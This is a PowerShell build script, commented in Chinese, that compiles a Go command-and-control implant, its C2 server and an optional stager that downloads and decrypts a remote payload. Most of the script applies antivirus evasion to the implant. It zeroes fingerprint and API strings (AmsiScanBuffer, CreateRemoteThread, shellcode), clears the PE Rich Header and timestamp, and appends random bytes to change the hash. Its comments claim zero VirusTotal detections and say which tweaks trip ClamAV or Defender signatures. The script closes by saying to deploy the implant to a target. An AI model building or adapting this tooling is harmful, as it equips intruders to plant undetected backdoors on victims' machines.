# Fish Build Script for Windows
# go build + 后处理免杀 (不用garble，garble触发ClamAV Sliver签名)
# 不修改PE Section名 (修改后触发Microsoft Wacatac.B!ml)
# 0/60 VirusTotal检出率验证通过

param(
    [string]$C2Addr = "https://192.168.1.1:8443",
    [string]$Interval = "5",
    [string]$Jitter = "20",
    [string]$Platform = "windows",
    [string]$Arch = "amd64",
    [switch]$BuildStager = $false,
    [string]$StagerURL = "",
    [string]$DecryptKey = "85"
)

$ErrorActionPreference = "Stop"

# 重要: 不使用garble! garble的-tiny -literals混淆会重组PE结构，
# 触发ClamAV的Win.Trojan.Sliver签名。改用go build + 后处理。

$env:GOOS = $Platform
$env:GOARCH = $Arch

# 构建植入体
Write-Host "[+] Building implant for $Platform/$Arch..."

# 关键ldflags:
# -s -w: 去除符号表和调试信息
# -buildid=: 清空Go build ID (绕过YARA "go.buildid" 规则)
# -X: 注入运行时变量
$ldflags = "-s -w -buildid= -X main.c2Addr=$C2Addr -X main.intervalStr=$Interval -X main.jitterStr=$Jitter"

if ($Platform -eq "windows") {
    $ldflags = "$ldflags -H windowsgui"
}

$outputName = if ($Platform -eq "windows") { "fish.exe" } else { "fish_$Platform_$Arch" }

go build -buildvcs=false -ldflags $ldflags -o $outputName .

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Build failed"
    exit 1
}
Write-Host "[+] Implant built: $outputName"

# 构建C2服务端
Write-Host "[+] Building C2 server..."
$env:GOOS = ""
$env:GOARCH = ""
go build -buildvcs=false -o fish-server.exe ./server/

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Server built: fish-server.exe"
} else {
    Write-Host "[!] Server build failed"
    exit 1
}

# 构建Stager (可选)
if ($BuildStager -and $Platform -eq "windows") {
    Write-Host "[+] Building stager..."
    $stagerLdflags = "-s -w -buildid= -H windowsgui -X main.downloadURL=$StagerURL -X main.decryptKeyStr=$DecryptKey"
    
    go build -buildvcs=false -ldflags $stagerLdflags -o stager.exe ./stager/
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Stager built: stager.exe"
    } else {
        Write-Host "[!] Stager build failed"
    }
}

# 静态免杀后处理 (仅Windows)
if ($Platform -eq "windows") {
    Write-Host "[+] Applying evasion post-processing..."

    # 1. 修改PE时间戳
    go run -buildvcs=false ./evasion-tools/pepatch.go $outputName

    # 2. 去除Go build ID字符串 + runtime.main + 敏感API名 + Rich Header
    # 注意: 不修改PE Section名! 修改后触发Microsoft Wacatac.B!ml ML检测
    Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $patterns = @(
        [System.Text.Encoding]::ASCII.GetBytes("Go build ID: "),
        [System.Text.Encoding]::ASCII.GetBytes("Go buildinf"),
        [System.Text.Encoding]::ASCII.GetBytes("go.buildid"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.goexit"),
        [System.Text.Encoding]::ASCII.GetBytes("main.main"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.init"),
        [System.Text.Encoding]::ASCII.GetBytes("runtime.gc"),
        [System.Text.Encoding]::ASCII.GetBytes("shellcode"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualAlloc"),
        [System.Text.Encoding]::ASCII.GetBytes("VirtualProtect"),
        [System.Text.Encoding]::ASCII.GetBytes("NtAllocateVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("NtProtectVirtualMemory"),
        [System.Text.Encoding]::ASCII.GetBytes("AmsiScanBuffer"),
        [System.Text.Encoding]::ASCII.GetBytes("EtwEventWrite"),
        [System.Text.Encoding]::ASCII.GetBytes("CreateRemoteThread"),
        [System.Text.Encoding]::ASCII.GetBytes("WriteProcessMemory")
    )
    $replaced = 0
    foreach ($pattern in $patterns) {
        for ($i = 0; $i -lt $bytes.Length - $pattern.Length; $i++) {
            $match = $true
            for ($j = 0; $j -lt $pattern.Length; $j++) {
                if ($bytes[$i + $j] -ne $pattern[$j]) { $match = $false; break }
            }
            if ($match) {
                for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$i + $j] = 0x00 }
                $replaced++
            }
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)
    Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"

    # 3. 清除Rich Header (Go编译器指纹)
    Write-Host "[+] Clearing Rich Header..."
    $bytes = [System.IO.File]::ReadAllBytes($outputName)
    $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
    for ($i = 0; $i -lt [Math]::Min($bytes.Length, 4096); $i++) {
        $match = $true
        for ($j = 0; $j -lt 4; $j++) {
            if ($bytes[$i + $j] -ne $richSig[$j]) { $match = $false; break }
        }
        if ($match) {
            # 找到Rich签名，向前找到DanS标记，清零整个Rich Header
            $richEnd = $i + 8
            $richStart = $i
            for ($k = $i - 1; $k -ge 0; $k--) {
                if ($bytes[$k] -eq 0x53 -and $bytes[$k+1] -eq 0x6E -and $bytes[$k+2] -eq 0x61 -and $bytes[$k+3] -eq 0x44) {
                    $richStart = $k
                    break
                }
            }
            for ($k = $richStart; $k -lt $richEnd -and $k -lt $bytes.Length; $k++) {
                $bytes[$k] = 0x00
            }
            Write-Host "[+] Rich Header cleared at offset $richStart"
            break
        }
    }
    [System.IO.File]::WriteAllBytes($outputName, $bytes)

    # 4. 附加随机overlay数据改变文件哈希 (4KB随机数据)
    $randomBytes = New-Object byte[] 4096
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($randomBytes)
    $original = [System.IO.File]::ReadAllBytes($outputName)
    $modified = New-Object byte[] ($original.Length + $randomBytes.Length)
    [System.Array]::Copy($original, $modified, $original.Length)
    [System.Array]::Copy($randomBytes, 0, $modified, $original.Length, $randomBytes.Length)
    [System.IO.File]::WriteAllBytes($outputName, $modified)
    Write-Host "[+] Overlay data appended (4096 bytes)"
}

# 最终输出
$fileInfo = Get-Item $outputName
Write-Host ""
Write-Host "=== Build Summary ==="
Write-Host "[+] Platform: $Platform/$Arch"
Write-Host "[+] Implant: $outputName ($($fileInfo.Length) bytes)"
Write-Host "[+] Server: fish-server.exe"
Write-Host "[+] Garble: No (garble triggers ClamAV Sliver signature)"
Write-Host "[+] Evasion: API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
if ($BuildStager) {
    $stagerInfo = Get-Item stager.exe -ErrorAction SilentlyContinue
    if ($stagerInfo) {
        Write-Host "[+] Stager: stager.exe ($($stagerInfo.Length) bytes)"
    }
}
Write-Host ""
Write-Host "Usage:"
Write-Host "  Server:  fish-server.exe [listen_addr]   (default :8443)"
Write-Host "  Implant: Deploy $outputName to target"
